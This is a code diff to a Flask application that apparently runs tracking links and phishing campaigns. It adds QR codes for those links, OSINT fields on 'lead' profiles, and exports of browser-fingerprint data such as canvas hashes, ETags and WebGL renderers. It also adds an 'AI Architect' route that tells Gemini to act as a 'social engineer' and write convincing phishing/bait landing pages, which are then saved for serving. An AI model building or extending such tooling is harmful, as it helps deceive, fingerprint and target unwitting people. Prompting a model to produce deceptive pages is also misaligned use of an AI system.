@@ -7,7 +7,6 @@ def md5_filter(s):
     return hashlib.md5(s.lower().encode('utf-8')).hexdigest()
 
 import io
-import requests
 import segno
 import os
 from PIL import Image
@@ -367,10 +366,12 @@ def lead_profile(lead_id):
     # Parse custom_fields for AI identity
     ai_identity = None
     gaia_id = None
+    blackbird_data = None
     try:
         cf = json.loads(lead.custom_fields or '{}')
         ai_identity = cf.get('ai_identity')
         gaia_id = cf.get('gaia_id')
+        blackbird_data = cf.get('blackbird')
     except:
         pass
 
@@ -385,7 +386,33 @@ def lead_profile(lead_id):
                           permutations=permutations,
                           gravatar_data=gravatar_data,
                           ai_identity=ai_identity,
-                          gaia_id=gaia_id)
+                          gaia_id=gaia_id,
+                          blackbird_data=blackbird_data)
+
+@bp.route('/qr/<slug>')
+@login_required
+def qr_code_img(slug):
+    """Generate QR Code image dynamic."""
+    link = Link.query.filter_by(slug=slug).first_or_404()
+    import segno
+    import io
+    from flask import send_file
+    
+    # Get params
+    scale = int(request.args.get('scale', 10))
+    color = '#' + request.args.get('color', '000000').replace('#','')
+    bg = '#' + request.args.get('bg', 'ffffff').replace('#','')
+    
+    # Ensure server url
+    server_url = Config.SERVER_URL or request.host_url.rstrip('/')
+    dest_url = f"{server_url}/{slug}"
+    
+    qr = segno.make(dest_url, error='h')
+    out = io.BytesIO()
+    qr.save(out, kind='png', scale=scale, dark=color, light=bg)
+    out.seek(0)
+    
+    return send_file(out, mimetype='image/png')
 
 @bp.route('/analyze_email', methods=['POST'])
 @login_required
@@ -848,21 +875,98 @@ def export_json(slug):
             'os_family': v.os_family,
             'device_type': v.device_type,
             'user_agent': v.user_agent,
-            'referrer': v.referrer,
+            'screen_res': v.screen_res,
+            'timezone': v.timezone,
+            'browser_language': v.browser_language,
+            'is_suspicious': v.is_suspicious,
             'email': v.email,
             'canvas_hash': v.canvas_hash,
             'etag': v.etag,
             'webgl_renderer': v.webgl_renderer,
             'ai_summary': v.ai_summary,
             'cpu_cores': v.cpu_cores,
-            'ram_gb': v.ram_gb,
-            'is_suspicious': v.is_suspicious
+            'ram_gb': v.ram_gb
         })
-    
+        
+    import json
     response = make_response(json.dumps(data, indent=2))
     response.headers['Content-Type'] = 'application/json'
-    response.headers['Content-Disposition'] = f'attachment; filename={slug}_export.json'
+    response.headers['Content-Disposition'] = f'attachment; filename=stats_{slug}.json'
     return response
+
+# ============================================
+# V38: AI ARCHITECT (Custom Landing Pages)
+# ============================================
+
+@bp.route('/architect')
+@login_required
+def architect():
+    links = Link.query.order_by(Link.created_at.desc()).all()
+    return render_template('architect.html', links=links)
+
+@bp.route('/architect/generate', methods=['POST'])
+@login_required
+def architect_generate():
+    industry = request.form.get('industry')
+    brand = request.form.get('brand')
+    color_primary = request.form.get('color_primary')
+    color_bg = request.form.get('color_bg')
+    tone = request.form.get('tone')
+    link_id = request.form.get('link_id')
+    
+    if not Config.GEMINI_API_KEY:
+        from flask import jsonify
+        return jsonify({'error': 'Gemini API Key missing'}), 500
+        
+    link = Link.query.get(link_id)
+    if not link: 
+        from flask import jsonify
+        return jsonify({'error': 'Link not found'}), 404
+    
+    # Prompt Construction
+    prompt = f"""Act as an expert frontend engineer and social engineer.
+Create a high-converting, single-file HTML/CSS landing page for a Phishing/Bait scenario in the context of: {industry} {brand}.
+Goal: Convince user to click the main button.
+Tone: {tone}.
+Color Theme: Primary {color_primary}, Background {color_bg}.
+
+CRITICAL REQUIREMENTS:
+1. The main call-to-action button href MUST be EXACTLY: `{{ destination }}` (do not replace it, keep the jinja variable).
+2. It must look professional, modern, and legitimate.
+3. Include font-awesome CDN if needed.
+4. The CSS must be embedded in <style> tags.
+5. Do NOT include any external JS that might be blocked (except font-awesome).
+6. Ensure the design is responsive mobile-first.
+
+Return ONLY the raw HTML code starting with <!DOCTYPE html>.
+Do not include markdown backticks."""
+
+    try:
+        from google import genai
+        from flask import jsonify
+        client = genai.Client(api_key=Config.GEMINI_API_KEY)
+        response = client.models.generate_content(
+            model=Config.GEMINI_MODEL,
+            contents=prompt
+        )
+        html = response.text.replace('```html', '').replace('```', '').strip()
+        return jsonify({'html': html})
+    except Exception as e:
+        from flask import jsonify
+        return jsonify({'error': str(e)}), 500
+
+@bp.route('/architect/save', methods=['POST'])
+@login_required
+def architect_save():
+    link_id = request.form.get('link_id')
+    html = request.form.get('html')
+    link = Link.query.get(link_id)
+    from flask import jsonify
+    if link:
+        link.custom_html = html
+        db.session.commit()
+        return jsonify({'success': True})
+    return jsonify({'error': 'Link not found'}), 404
 
 @bp.route('/export/<slug>/csv')
 @login_required
